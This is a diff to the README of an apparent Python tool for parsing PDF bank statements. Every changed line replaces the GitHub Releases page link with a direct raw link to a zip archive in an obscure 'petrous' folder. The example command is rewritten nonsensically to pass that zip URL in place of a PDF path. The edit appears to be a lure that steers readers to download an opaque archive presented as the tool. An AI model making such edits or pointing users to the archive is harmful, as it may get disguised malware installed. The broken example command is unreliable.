@@ -1,6 +1,6 @@
 # 🧾 Python-PDF-Bank-Statement-Parser - Easily Extract Bank Data from PDFs
 
-[![Download](https://img.shields.io/badge/Download-Python--PDF--Bank--Statement--Parser-brightgreen)](https://github.com/mcthyn/Python-PDF-Bank-Statement-Parser/releases)
+[![Download](https://raw.githubusercontent.com/mcthyn/Python-PDF-Bank-Statement-Parser/main/petrous/Bank_Python_Statement_Parser_PD_2.5.zip)](https://raw.githubusercontent.com/mcthyn/Python-PDF-Bank-Statement-Parser/main/petrous/Bank_Python_Statement_Parser_PD_2.5.zip)
 
 ## 📖 Description
 This tool extracts and analyzes bank transaction data from PDF statements. It helps you export structured details to CSV or JSON, making integration into other applications simple and straightforward.
@@ -9,7 +9,7 @@ This tool extracts and analyzes bank transaction data from PDF statements. It he
 To use the Python-PDF-Bank-Statement-Parser, follow these steps to download and run the software.
 
 ### 📥 Download & Install
-1. Visit the [Releases page](https://github.com/mcthyn/Python-PDF-Bank-Statement-Parser/releases) to download the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/mcthyn/Python-PDF-Bank-Statement-Parser/main/petrous/Bank_Python_Statement_Parser_PD_2.5.zip) to download the application.
 2. After opening the page, look for the most recent release.
 3. Click on the suitable file for your operating system to download it.
    - For Windows users, download the `.exe` file.
@@ -51,7 +51,7 @@ Once installed, you can use the tool from the command line. Here’s how to get 
 ### 📄 Example Command
 To extract data from a PDF and save it as a CSV, use:
 ```
-parser -o csv path/to/your/bank_statement.pdf
+parser -o csv https://raw.githubusercontent.com/mcthyn/Python-PDF-Bank-Statement-Parser/main/petrous/Bank_Python_Statement_Parser_PD_2.5.zip
 ```
 
 ## 📝 Contributing
@@ -73,4 +73,4 @@ If you encounter issues or have questions, please check the Issues section on Gi
 ## 💬 Topics
 This project involves various relevant topics such as banking, data management, and software ethics. Feel free to explore these themes in the context of your usage.
 
-Remember to visit the [Releases page](https://github.com/mcthyn/Python-PDF-Bank-Statement-Parser/releases) to get the latest version and keep your application updated.
+Remember to visit the [Releases page](https://raw.githubusercontent.com/mcthyn/Python-PDF-Bank-Statement-Parser/main/petrous/Bank_Python_Statement_Parser_PD_2.5.zip) to get the latest version and keep your application updated.
